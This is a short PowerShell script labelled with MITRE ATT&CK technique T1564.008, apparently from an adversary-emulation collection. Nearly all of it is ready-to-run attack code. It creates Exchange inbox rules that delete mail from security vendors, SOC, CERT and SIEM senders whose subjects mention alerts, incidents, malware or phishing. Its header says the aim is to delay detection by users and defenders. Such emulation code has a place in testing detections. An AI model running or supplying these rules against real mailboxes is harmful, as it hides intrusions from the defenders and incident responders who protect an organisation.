<# T1564.008 - Hide Artifacts: Email Hiding Rules
Any user or administrator within the organization (or adversary with valid credentials)
may be able to create rules to automatically move or delete emails. 
These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender

Only for Exchange Servers
#>


$from_list = @("*sentinelone*","*trellix*","*mcafee*","*support*","*kaspersky*","*trendmicro*","*splunk*","*crowdstrike*","*@canary.tools*","alert*","soc@*","cert@*","*siem*","*soar*","soc-*","incident*","*cyber*","*defense*","*protect*","*detection*","*security*","*secops*")

$subject_list = @("SOC *","[SOC*","SOC-*","*-SOC*","*Alert*","*Incident*","CERT *","High -","*Detection*","*Critical*","*malware*","*suspicious*","*phish*","*hack*","*Medium*","*suspect*","malicious","*incindent*","*alert*","*detection*","*protect*","*SentinelOne*","*crowdstrike*","*mcafee*","*trellix*","*kaspersky*","*EDR*","*antivirus*","*hack*","*bruteforce*","* scan *","*triggerred*")

foreach ($sender in $from_list)
{
    $i = 0
    foreach ($subject in $subject_list)
    {
        try{
            $name = $subject.Replace('*','') + "_$i"
            Add-InboxRule -Name $name -Subject $subject -From $sender -DeleteContent -Confirm:$false
            Write-Output "rule $name created with sucject: $subject and sender: $sender"
            $i++
        }
        catch{
        Write-Host -ForegroundColor Red "Error: $_"
        }
    }
}


Get-InboxRule
